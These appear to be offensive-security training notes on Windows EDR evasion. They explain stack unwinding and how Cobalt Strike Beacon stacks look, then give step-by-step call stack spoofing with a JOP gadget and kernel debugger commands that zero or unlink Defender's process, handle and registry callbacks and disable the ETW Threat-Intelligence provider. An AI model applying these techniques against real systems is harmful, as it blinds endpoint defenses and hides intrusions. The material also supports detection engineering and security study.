Stack unwinding walks back over the frames at runtime — primarily for exception handling. When a function throws, the runtime walks each frame following return addresses, cleaning up as it goes, until it reaches a handler. Unhandled exceptions appear as text representations of an unwound stack:

Unhandled Exception: System.NullReferenceException: Object reference not set to an instance of an object.
   at StackDemo.Program.DemoFunction3() in C:\StackDemo\Program.cs:line 35
   at StackDemo.Program.DemoFunction2() in C:\StackDemo\Program.cs:line 30
   at StackDemo.Program.DemoFunction1() in C:\StackDemo\Program.cs:line 25
   at StackDemo.Program.Main(String[] args) in C:\StackDemo\Program.cs:line 20

Why x64 needs this and x86 didn't. On x86, every function pushed ebp at the start so the runtime could just follow the ebp chain to walk frames. x64 dropped the frame pointer for performance (one fewer register tied up, smaller prologues). Without it, there's no in-memory chain to follow. The compiler instead records, in static tables in the PE, exactly how each function adjusted the stack — so the runtime can reconstruct the chain by looking up RIP against those tables.

These tables live in the PE's .pdata (entries) and .xdata (unwind data) sections. Three structures cooperate:

StructureLives inWhat it answers
RUNTIME_FUNCTION.pdata"Which function does this RIP belong to?" Holds BeginAddress, EndAddress, and a pointer to UNWIND_INFO.
UNWIND_INFO.xdata"How big is its frame and does it have an exception handler?" Holds prologue size, count of UNWIND_CODE entries, optional handler pointer.
UNWIND_CODE (array).xdata"What does each prologue instruction do?" One entry per prologue op (push nonvolatile, allocate small/large stack, save XMM, etc.).
RUNTIME_FUNCTION

One entry per stack-allocating function — holds the function's start, end, and a pointer to its UNWIND_INFO:

typedef struct _RUNTIME_FUNCTION {
    DWORD BeginAddress;   // RVA of function start
    DWORD EndAddress;     // RVA of function end
    DWORD UnwindData;     // RVA of UNWIND_INFO
} RUNTIME_FUNCTION;
UNWIND_INFO

Describes how the prologue sets up the stack and spills registers, whether the function has an exception handler (and a pointer to it), and an array of UNWIND_CODE entries.

UNWIND_CODE

One entry per prologue operation (push nonvolatile, set frame pointer, spill register, etc.). Each describes how to "undo" that operation when unwinding.

The full unwind cycle:

  1. RtlLookupFunctionEntry(RIP) — binary-search the loaded module's .pdata array. Returns the RUNTIME_FUNCTION whose [BeginAddress, EndAddress) contains RIP. If RIP isn't inside any registered function (i.e. it's in unbacked memory), the lookup returns NULL.
  2. Use the returned UnwindData pointer to dereference the UNWIND_INFO.
  3. RtlVirtualUnwind replays the UNWIND_CODE array in reverse — popping bytes off the simulated stack until RSP points at the return address.
  4. The return address becomes the new RIP — loop back to step 1 for the caller.
  5. Stop when an exception handler runs, or when the lookup fails (top of the chain).

Why this matters for evasion. A clean unwind requires every RIP on the chain to belong to a loaded module with valid .pdata. The moment one frame's RIP points into unbacked memory (reflectively-loaded DLL, BOF allocation, etc.), RtlLookupFunctionEntry returns NULL and the walker falls back to dumping raw stack bytes — those are the 0x0000…-looking entries you see in Beacon stacks below. EDRs use this signature to spot calls from unbacked memory without ever attempting full exception handling.

Security products use this to analyse the origin of suspicious API calls without performing the cleanup. Breakpoint on MessageBoxW and dump the stack frames just before the call. A legitimate program shows a clean chain — ntdll!RtlUserThreadStart → StackDemo!main → StackDemo!demoFunction → User32!MessageBoxW:

0:000> bp User32!MessageBoxW
0:000> g
Breakpoint 0 hit

0:000> k
 # Child-SP          RetAddr               Call Site
00 00000092`f970fbd8 00007ff7`e0da101d     USER32!MessageBoxW
01 00000092`f970fbe0 00007ff7`e0da1039     StackDemo!demoFunction+0x1d
02 00000092`f970fc10 00007ff7`e0da1260     StackDemo!main+0x9
03 (Inline Function) --------`--------     StackDemo!invoke_main+0x22
04 00000092`f970fc40 00007ffa`c68ee8d7     StackDemo!__scrt_common_main_seh+0x10c
05 00000092`f970fc80 00007ffa`c78bc34c     KERNEL32!BaseThreadInitThunk+0x17
06 00000092`f970fcb0 00000000`00000000     ntdll!RtlUserThreadStart+0x2c

A BOF running under Cobalt Strike's Beacon, however, looks very different — Beacon and the BOF are loaded into unbacked memory regions with no associated unwind info, so the walk reads garbage from the stack:

0:002> k
 # Child-SP          RetAddr               Call Site
00 00000000`00daee68 00000000`0417003a     user32!MessageBoxW
01 00000000`00daee70 00000000`04171640     0x417003a
02 00000000`00daee78 00000000`041716cb     0x4171640
03 00000000`00daee80 0000008b`00000000     0x41716cb
04 00000000`00daee88 00000000`001466f0     0x0000008b`00000000
05 00000000`00daee90 00007ffa`c5a72e6f     0x1466f0
06 00000000`00daee98 00007ffa`c5a72e6f     user32!SLReplaceSel+0x193
07 00000000`00daeea0 00000000`33225278     user32!SLReplaceSel+0x193
08 00000000`00daeea8 00000000`00ebefe0     0x33225278
09 00000000`00daeeb0 00000000`00f2716b     0xebefe0
0a 00000000`00daeeb8 00000000`00000005     0xf2716b
0b 00000000`00daeec0 00000000`00000000     0x5

EDRs flag API calls originating from unbacked memory, and (in the case of module stomping) APIs being called from memory backed by modules that wouldn't normally call them.

2.9.5 Clean stacks

The goal is to produce stacks that look legitimate even when running from unbacked memory. Three places matter most:

Loaders

Loaders are typically injected as shellcode into unbacked memory, then call APIs (VirtualAlloc, VirtualProtect, LoadLibrary) to allocate and load the next capability.

Post-ex

Post-ex capabilities (reflective DLLs, BOFs) call APIs to achieve their objective. Beacon itself uses InternetConnectA for HTTP/S C2.

Sleeping

Some products hunt Beacons in their sleep state (post-Sleep or WaitForSingleObject). A sleeping thread whose stack leads to unbacked memory is a high-confidence detection.

Call stack spoofing

Push data onto the stack that resembles legitimate frames. The very first stack frame on a thread has a return address of 0x0; the unwinder treats that as the end of the stack and stops walking. So push fake frames above the real ones:

  1. Push 0x0 onto the stack
  2. Grow the stack by the size of a legitimate RtlUserThreadStart frame
  3. Push the address of RtlUserThreadStart+0x2c

The 0x2c offset is Windows-version specific — using a different value won't break the technique but may stand out to an analyst. The resulting MessageBoxW stack looks valid:

000000bd`dc1df948 00007ffb`2997c34c     User32!MessageBoxW
000000bd`dc1df950 00000000`00000000     ntdll!RtlUserThreadStart+0x2c
000000bd`dc1dfad8 00007ff7`f036166c     <garbage>
000000bd`dc1dfb20 00007ffb`2997c34c     KERNEL32!BaseThreadInitThunk+0x17
000000bd`dc1dfb50 00000000`00000000     ntdll!RtlUserThreadStart+0x2c

Stack unwinding terminates at the fake RtlUserThreadStart frame, hiding everything below:

000000bd`dc1df948 00007ffb`2997c34c     User32!MessageBoxW
000000bd`dc1df950 00000000`00000000     ntdll!RtlUserThreadStart+0x2c

Additional frames (e.g. BaseThreadInitThunk) can be pushed for more realism. The implementation challenge is getting execution back after the API returns — popping 0x0 off the stack and trying to ret there crashes the program.

The fix uses nonvolatile registers and a jump-oriented programming (JOP) gadget:

  1. Before pushing 0x0, pop the real return address into a nonvolatile register (R12–R15). Nonvolatile registers are guaranteed to be preserved by any callee.
  2. Store the address of a small cleanup routine (that removes fake frames and jumps to the saved return address) in another nonvolatile register (e.g. RBX).
  3. Find a JOP gadget — a byte pattern like ff 23 (jmp qword ptr [rbx]) somewhere in a real DLL's .text section.
  4. Push one final fake frame with the gadget's address as its return address.

When the API returns, execution lands on the gadget, which jumps to the cleanup routine, which removes the fake frames and jumps to the saved real return address. CallStackSpoofer by William Burgess is a reference implementation.

2.9.6 API proxying

An alternative to spoofing: get something else to execute the API on your behalf via a callback that runs in a separate thread. Most callbacks run in the caller's thread, which doesn't help. Chetan Nayak's technique uses TpAllocWork / TpPostWork / TpReleaseWork. The callback is a custom assembly stub that sets up registers and stack as the target API expects, then jumps to it.

The resulting call stack starts legitimately at RtlUserThreadStart via TppWorkerThread. Drawbacks: no gadget needed and no fake frames, but you can't read the API's return value. Best suited to Nt* APIs that write output to a pointer rather than returning it in EAX.

2.10 Kernel Callbacks

The kernel exposes callbacks for kernel drivers to receive notifications on critical events — process creation, image loads, handle operations, thread creation, registry changes. These callbacks aren't read-only: drivers can influence and block the operation. Three callback families covered below:

APITriggers onStorage table
PsSetCreateProcessNotifyRoutineExProcess create/exitnt!PspCreateProcessNotifyRoutine
ObRegisterCallbacksHandle create/duplicateLinked in _OBJECT_TYPE.CallbackList
CmRegisterCallbackExRegistry operationsnt!CallbackListHead

2.10.1 PsSetCreateProcessNotifyRoutineEx

A driver registers a process create/exit callback like this:

#include "driver.h"

NTSTATUS
DriverEntry(
    _In_ PDRIVER_OBJECT  DriverObject,
    _In_ PUNICODE_STRING RegistryPath
)
{
    NTSTATUS status;

    status = PsSetCreateProcessNotifyRoutineEx(
    	PcreateProcessNotifyRoutineEx,
        TRUE);

    ...

    return status;
}

void PcreateProcessNotifyRoutineEx(
    _Inout_     PEPROCESS               Process,
    _In_        HANDLE                  ProcessId,
    _Inout_opt_ PPS_CREATE_NOTIFY_INFO  CreateInfo
)
{
    ...
}

The callback receives a pointer to the new process's EPROCESS. To block the create, set PPS_CREATE_NOTIFY_INFO.CreationStatus to a non-success NTSTATUS:

CreateInfo->CreationStatus = STATUS_ACCESS_DENIED;

Windows Defender uses this to inspect command lines and block known abuse patterns — named-pipe impersonation, the SilentCleanup scheduled-task UAC bypass, etc. It's why APIs like CreateProcessWithLogonW return error code 5 (access denied):

beacon> pth foo\bar 00000000000000000000000000000000

user	: bar
domain	: foo
program	: C:\WINDOWS\system32\cmd.exe /c echo 7410b8d94a2 > \\.\pipe\8ab6cc
impers.	: no
NTLM	: 00000000000000000000000000000000

ERROR kuhl_m_sekurlsa_pth ; CreateProcessWithLogonW (0x00000005)

PsSetCreateThreadNotifyRoutineEx and PsSetLoadImageNotifyRoutineEx register similar callbacks for thread creation/exit and image map. Their tables (nt!PspCreateThreadNotifyRoutine, nt!PspLoadImageNotifyRoutine) work the same way.

Inspect the PspCreateProcessNotifyRoutine table:

lkd> dp nt!PspCreateProcessNotifyRoutine
fffff804`b0b04b80  ffffbf0f`e4dfb52f ffffbf0f`e823bb5f
fffff804`b0b04b90  ffffbf0f`e823b82f ffffbf0f`e823b8ef
fffff804`b0b04ba0  ffffbf0f`e823b64f ffffbf0f`e84e888f
fffff804`b0b04bb0  ffffbf0f`e84e8c1f ffffbf0f`e84e7c5f
fffff804`b0b04bc0  ffffbf0f`e9fbf15f ffffbf0f`ea68da5f
fffff804`b0b04bd0  ffffbf0f`eb37df5f ffffbf0f`eb375cdf
fffff804`b0b04be0  00000000`00000000 00000000`00000000
fffff804`b0b04bf0  00000000`00000000 00000000`00000000

Each pointer in the table is not a direct function pointer — it points to an undocumented _EX_CALLBACK_ROUTINE_BLOCK that holds the actual callback function plus a rundown-protection ref count:

typedef struct _EX_CALLBACK_ROUTINE_BLOCK {
    EX_RUNDOWN_REF RundownProtect;   // ref count + flag bits
    PEX_CALLBACK_FUNCTION Function;  // ← the real callback
    PVOID Context;                   // driver-defined opaque
} EX_CALLBACK_ROUTINE_BLOCK, *PEX_CALLBACK_ROUTINE_BLOCK;

Each table holds up to 64 entries.

Why the low nibble trick is needed. Windows packs rundown-protection state into the bottom 4 bits of the table-entry pointer. These bits would normally be zero (since _EX_CALLBACK_ROUTINE_BLOCK is 16-byte aligned), so the kernel reuses them as flags — saving a whole field per entry. Before you dereference the pointer, you have to mask those bits off:

What you see in the tableWhat it actually is
ffffbf0f`e823bb5fencoded entry (low nibble = 0xF = rundown flags)
... & 0xFFFFFFFFFFFFFFF0ffffbf0f`e823bb50 — real _EX_CALLBACK_ROUTINE_BLOCK address
+0x08Function field — the driver callback to attack

Take the second entry (ffffbf0f`e823bb5f):

lkd> dq (ffffbf0f`e823bb5f & 0xfffffffffffffff0)
ffffbf0f`e823bb50  00000000`00000020 fffff804`42fdaa60
ffffbf0f`e823bb60  00000000`00000006 [...snip...]

fffff804`42fdaa60 is the callback function. Find its module:

lkd> lm a fffff804`42fdaa60
Browse full module list
start             end                 module name
fffff804`42f80000 fffff804`4301b000   WdFilter   (deferred)

The callback lives in WdFilter — Defender's driver. To disable it, zero out the table entry — not the routine block. Once the table entry reads 0x0000000000000000, the kernel skips it during the notification fan-out:

lkd> ep fffff804`b0b04b88 0
lkd> dp nt!PspCreateProcessNotifyRoutine
fffff804`b0b04b80  ffffbf0f`e4dfb52f 00000000`00000000
fffff804`b0b04b90  ffffbf0f`e823b82f ffffbf0f`e823b8ef
fffff804`b0b04ba0  ffffbf0f`e823b64f ffffbf0f`e84e888f
fffff804`b0b04bb0  ffffbf0f`e84e8c1f ffffbf0f`e84e7c5f
fffff804`b0b04bc0  ffffbf0f`e9fbf15f ffffbf0f`ea68da5f
fffff804`b0b04bd0  ffffbf0f`eb37df5f ffffbf0f`eb375cdf

The PspCreateThreadNotifyRoutine and PspLoadImageNotifyRoutine tables work identically.

2.10.2 ObRegisterCallbacks

ObRegisterCallbacks registers pre and post notifications for handle operations. The pre-operation callback receives a POB_PRE_OPERATION_INFORMATION containing the requested ACCESS_MASK. The driver can strip privileges from the handle — e.g. remove PROCESS_VM_READ from handles to LSASS so they can't be used for memory reads:

OB_PREOP_CALLBACK_STATUS
PobPreOperationCallback(
	_In_ PVOID RegistrationContext,
	_In_ POB_PRE_OPERATION_INFORMATION OperationInformation
)
{
	...

	ACCESS_MASK requested = OperationInformation->Parameters->CreateHandleInformation.OriginalDesiredAccess;

	if (requested & 0x0010) {
		OperationInformation->Parameters->CreateHandleInformation.DesiredAccess = requested &= ~0x0010;
	}

    ...

	return OB_PREOP_SUCCESS;
}

Object callbacks aren't in a global table — they hang off each object type's _OBJECT_TYPE structure. nt!ObTypeIndexTable indexes those types:

lkd> dp nt!ObTypeIndexTable
fffff804`b0bc6800  00000000`00000000 ffffe400`d7db9000
fffff804`b0bc6810  ffffbf0f`e4691d90 ffffbf0f`e4698090
fffff804`b0bc6820  ffffbf0f`e46adea0 ffffbf0f`e4698b90
fffff804`b0bc6830  ffffbf0f`e4689080 ffffbf0f`e469c650
fffff804`b0bc6840  ffffbf0f`e468b450 ffffbf0f`e4695dc0
fffff804`b0bc6850  ffffbf0f`e4689810 ffffbf0f`e468e9e0
fffff804`b0bc6860  ffffbf0f`e468eb50 ffffbf0f`e469d3f0
fffff804`b0bc6870  ffffbf0f`e469d560 ffffbf0f`e46a8980

For example, ffffbf0f`e468b450 describes the Process object type. The CallbackList member is a doubly-linked list of registered callbacks:

lkd> dt nt!_OBJECT_TYPE ffffbf0f`e468b450
   +0x000 TypeList         : _LIST_ENTRY [ 0xffffbf0f`e468b450 - 0xffffbf0f`e468b450 ]
   +0x010 Name             : _UNICODE_STRING "Process"
   +0x020 DefaultObject    : (null)
   +0x028 Index            : 0x8 ''
   +0x02c TotalNumberOfObjects : 0x91
   +0x030 TotalNumberOfHandles : 0x64c
   +0x034 HighWaterNumberOfObjects : 0xa7
   +0x038 HighWaterNumberOfHandles : 0x6ff
   +0x040 TypeInfo         : _OBJECT_TYPE_INITIALIZER
   +0x0b8 TypeLock         : _EX_PUSH_LOCK
   +0x0c0 Key              : 0x636f7250
   +0x0c8 CallbackList     : _LIST_ENTRY [ 0xffffd380`a25f5a30 - 0xffffd380`a234f8c0 ]
   +0x0d8 SeMandatoryLabelMask : 3
   +0x0dc SeTrustConstraintMask : 0

TypeInfo holds the kernel's own procedures for the type — open, close, delete, etc.:

[+0x030] DumpProcedure    : 0x0 : 0x0 [Type: void (__cdecl*)(void *,_OBJECT_DUMP_CONTROL *)]
[+0x038] OpenProcedure    : 0xfffff804b05cf350 : ntkrnlmp!PspProcessOpen+0x0 [Type: long (__cdecl*)(_OB_OPEN_REASON,char,_EPROCESS *,void *,unsigned long *,unsigned long)]
[+0x040] CloseProcedure   : 0xfffff804b0607f40 : ntkrnlmp!PspProcessClose+0x0 [Type: void (__cdecl*)(_EPROCESS *,void *,unsigned __int64,unsigned __int64)]
[+0x048] DeleteProcedure  : 0xfffff804b04a30b0 : ntkrnlmp!PspProcessDelete+0x0 [Type: void (__cdecl*)(void *)]
[+0x050] ParseProcedure   : 0x0 : 0x0 [Type: long (__cdecl*)(void *,void *,_ACCESS_STATE *,char,unsigned long,_UNICODE_STRING *,_UNICODE_STRING *,void *,_SECURITY_QUALITY_OF_SERVICE *,void * *)]
[+0x050] ParseProcedureEx : 0x0 : 0x0 [Type: long (__cdecl*)(void *,void *,_ACCESS_STATE *,char,unsigned long,_UNICODE_STRING *,_UNICODE_STRING *,void *,_SECURITY_QUALITY_OF_SERVICE *,_OB_EXTENDED_PARSE_PARAMETERS *,void * *)]
[+0x058] SecurityProcedure : 0xfffff804b04c9df0 : ntkrnlmp!SeDefaultObjectMethod+0x0 [Type: long (__cdecl*)(void *,_SECURITY_OPERATION_CODE,unsigned long *,void *,unsigned long *,void * *,_POOL_TYPE,_GENERIC_MAPPING *,char)]
[+0x060] QueryNameProcedure : 0x0 : 0x0 [Type: long (__cdecl*)(void *,unsigned char,_OBJECT_NAME_INFORMATION *,unsigned long,unsigned long *,char)]
[+0x068] OkayToCloseProcedure : 0x0 : 0x0 [Type: unsigned char (__cdecl*)(_EPROCESS *,void *,void *,char)]

CallbackList contains CALLBACK_ENTRY_ITEM structures (64 bytes each):

typedef struct _CALLBACK_ENTRY_ITEM {
    LIST_ENTRY EntryItemList;
    OB_OPERATION Operations;
    DWORD Active;
    CALLBACK_ENTRY * CallbackEntry;
    PVOID ObjectType;
    POB_PRE_OPERATION_CALLBACK PreOperation;
    POB_POST_OPERATION_CALLBACK PostOperation;
    QWORD unk;
} CALLBACK_ENTRY_ITEM, * PCALLBACK_ENTRY_ITEM;

Relevant members:

  • Operations — 0x1 handle create, 0x2 handle duplicate, 0x3 both
  • Active — 0x1 enabled, 0x0 disabled
  • PreOperation / PostOperation — function pointers

Inspect an entry:

lkd> dq 0xffffd380a234f8c0 (0xffffd380a234f8c0 + 0x40)
ffffd380`a234f8c0  ffffbf0f`e468b518 ffffd380`a25f5a30
ffffd380`a234f8d0  00000001`00000003 ffffd380`a234f8a0
ffffd380`a234f8e0  ffffbf0f`e468b450 fffff804`42faf2b0
ffffd380`a234f8f0  00000000`00000000 00000000`00000000
ffffd380`a234f900  ffffbf0f`e477dd88

Operations is 3, Active is 1, PreOperation is at fffff804`42faf2b0, PostOperation is null. The PreOp lives in WdFilter:

lkd> lm a fffff804`42faf2b0
Browse full module list
start             end                 module name
fffff804`42f80000 fffff804`4301b000   WdFilter   (deferred)

To disable, write 0 to the Active member:

lkd> eb (0xffffd380a234f8c0 + 0x14) 0
lkd> dq 0xffffd380a234f8c0 (0xffffd380a234f8c0 + 0x40)
ffffd380`a234f8c0  ffffbf0f`e468b518 ffffd380`a25f5a30
ffffd380`a234f8d0  00000000`00000003 ffffd380`a234f8a0
ffffd380`a234f8e0  ffffbf0f`e468b450 fffff804`42faf2b0
ffffd380`a234f8f0  00000000`00000000 00000000`00000000
ffffd380`a234f900  ffffbf0f`e477dd88

2.10.3 CmRegisterCallbackEx

CmRegisterCallbackEx registers callbacks for registry operations. The callback signature:

NTSTATUS
ExCallbackFunction(
	_In_     PVOID CallbackContext,
	_In_opt_ PVOID Argument1,
	_In_opt_ PVOID Argument2
)
{
	...
}

Argument1 is a REG_NOTIFY_CLASS enum identifying the operation:

  • RegNtPreCreateKeyEx — thread attempting key creation
  • RegNtPreSaveKey — thread attempting to save key data
  • RegNtPreQueryKeySecurity — thread attempting to read key security
  • RegNtPreSetKeySecurity — thread attempting to set key security

Argument2 is a per-operation structure. For RegNtPreCreateKeyEx, it's a REG_CREATE_KEY_INFORMATION_V1 containing a pointer to a UNICODE_STRING with the key path. To block, return a non-success NTSTATUS — useful for stopping known privilege-escalation and UAC-bypass paths.

Registry callbacks are stored in nt!CallbackListHead:

lkd> dq nt!CallbackListHead
fffff806`92cf7290  ffff8f88`086c8d50 ffff8f88`0bce8150
fffff806`92cf72a0  00000000`00000000 00000000`00000000
fffff806`92cf72b0  fffff806`92cf72b0 fffff806`92cf72b0

This is a linked list of CMREG_CALLBACK structures:

typedef struct _CMREG_CALLBACK {
    LIST_ENTRY List;
    ULONG Unknown1;
    ULONG Unknown2;
    LARGE_INTEGER Cookie;
    PVOID Unknown3;
    PEX_CALLBACK_FUNCTION Function;
} CMREG_CALLBACK, *PCMREG_CALLBACK;

From the output above:

  • ffff8f88`086c8d50 — previous entry
  • ffff8f88`0bce8150 — next entry
  • fffff806`92cf72b0 — callback function

Walk forward with dq ffff8f88`0bce8150. Example Defender registry callback:

lkd> dq ffff8f88`086c8d50
ffff8f88`086c8d50  ffff8f88`0bce3bf0 fffff806`92cf7290
ffff8f88`086c8d60  00000000`00000000 01dbfff1`719185b6
ffff8f88`086c8d70  00000000`00000000 fffff806`2526aec0

lkd> lm a fffff806`2526aec0
Browse full module list
start             end                 module name
fffff806`25240000 fffff806`252db000   WdFilter   (deferred)

CMREG_CALLBACK has no Active member like CALLBACK_ENTRY_ITEM — disable instead by unlinking the entry from the list. To remove node N: update node N-1's next pointer to point at N+1, and N+1's previous pointer to point back at N-1. Any walk of the list skips N entirely.

2.11 ETW-TI

Event Tracing for Windows (ETW) is a logging mechanism originally designed for diagnosing user-mode apps and kernel drivers. It has three component roles:

RoleFunction
ProvidersApplications that generate event-tracing information
ConsumersApplications that subscribe to receive events
ControllersManage sessions and log storage; link providers and consumers

List providers with logman query providers from an elevated prompt. The Microsoft-Windows-Threat-Intelligence provider (ETW-TI) is an evolution that adds kernel instrumentation focused on security — memory management events that callbacks don't see:

logman query providers Microsoft-Windows-Threat-Intelligence

Provider                                 GUID
-------------------------------------------------------------------------------

0x0000040000000000  KERNEL_THREATINT_KEYWORD_PROCESS_IMPERSONATION_DOWN

Any process can subscribe to standard ETW providers, but the TI provider is restricted to consumers running at a protection level of:

  • PS_PROTECTED_ANTIMALWARE_LIGHT, or
  • SERVICE_LAUNCH_PROTECTED_ANTIMALWARE_LIGHT

That requires launching from an Early Launch Anti-Malware (ELAM) driver — special drivers that start anti-malware before any third-party software. ELAMs need a code-signing certificate with the Early Launch EKU. Dev environments can self-sign with makecert; production drivers require a Microsoft WHQL signature.

Community projects like JonMon and MentalTi work around this by using their driver to patch the in-memory PS_PROTECTION in their user-mode consumer's EPROCESS, tricking the kernel into treating it as protected. A driver can still only be loaded if it's signed (or test signing is enabled). Once loaded, JonMon can log events like RemoteVirtualAllocation for memory allocations into remote processes:

beacon> powerpick $pid
9012

To find where ETW-TI events are produced in the kernel, search ntoskrnl.exe for calls to EtwRegister. That reveals EtwpInitialize, which registers the ETW-TI GUID. The returned handle (EtwThreatIntProvRegHandle) is then required for EtwWrite/EtwWriteEx. Cross-referencing the handle shows every consumer in the kernel.

Some functions (PsImpersonateClient, NtMapViewOfSection) use it directly. More commonly, helpers wrap it — EtwTiLogSyscallUsage, EtwTiLogProtectExecVm, EtwTiLogSetContextThread, etc. EtwTiLogReadWriteVm can log READVM_LOCAL, WRITEVM_LOCAL, READVM_REMOTE, and WRITEVM_REMOTE — called from MiReadWriteVirtualMemory, which is called from the kernel-mode NtReadVirtualMemoryEx, NtWriteVirtualMemory, and NtReadVirtualMemory (not the user-mode wrappers in ntdll).

The global nt!EtwpDebuggerData finds (and lets you manipulate) registered ETW providers at runtime:

lkd> dp nt!EtwpDebuggerData
fffff806`92c0e910  e80c3804`082c0328 50040c88`106000c8
fffff806`92c0e920  ffffb30e`c37be900 ffffb30e`c383b000
fffff806`92c0e930  00000000`00001000 0000003c`00000000
fffff806`92c0e940  00000003`00002710 ffffffff`fffe7960
fffff806`92c0e950  00000000`00000004 11d2c24e`cf31fac5
fffff806`92c0e960  3bc93ec9`a000f385 00000000`00001000
fffff806`92c0e970  00000000`00000258 00000000`0103e1fd
fffff806`92c0e980  00002710`00000001 0000000a`00000043

    [1]              [Type: _LIST_ENTRY] // EtwNotificationGuidType

The relevant list is EtwTraceGuidType. Each entry is an _ETW_GUID_ENTRY with the provider GUID and a ProviderEnableInfo (a _TRACE_ENABLE_INFO) controlling whether the provider is enabled:

    [+0x008] Blink            : 0xffffb30ec37de400 [Type: _LIST_ENTRY *]

To disable a provider, set ProviderEnableInfo.IsEnabled to 0:

lkd> eb 0xffffb30ecc998a20 0

(*((ntkrnlmp!_TRACE_ENABLE_INFO *)0xffffb30ecc998a20)) [Type: _TRACE_ENABLE_INFO]
    [+0x000] IsEnabled        : 0x0 [Type: unsigned long]

Searching all 64 buckets for a specific GUID is wasteful — Windows assigns each provider to a bucket by hashing its GUID. A GUID's components:

typedef struct _GUID {
    unsigned long  Data1;
    unsigned short Data2;
    unsigned short Data3;
    unsigned char  Data4[8];
} GUID;

Bucket index = (Data1 ^ Data2 ^ Data4[0] ^ Data4[4]) & 0x3F:

(Data1 ^ (Data2 ^ Data4[0] ^ Data4[4])) & 0x3f

The Microsoft-Windows-Threat-Intelligence GUID is {F4E1897C-BB5D-5668-F1D8-040F4D8DD344}:

{ 0xF4E1897C, 0xBB5D, 0x5668, {0xF1, 0xD8, 0x04, 0x0F, 0x4D, 0x8D, 0xD3, 0x44} }
(0xF4E1897C ^ 0xBB5D ^ 0xF1 ^ 0x4D) & 0x3f = 1D

Bucket 0x1D (29). Walk entries in that bucket only and patch ProviderEnableInfo when the GUID matches.

logman query providers Microsoft-Windows-Threat-Intelligence
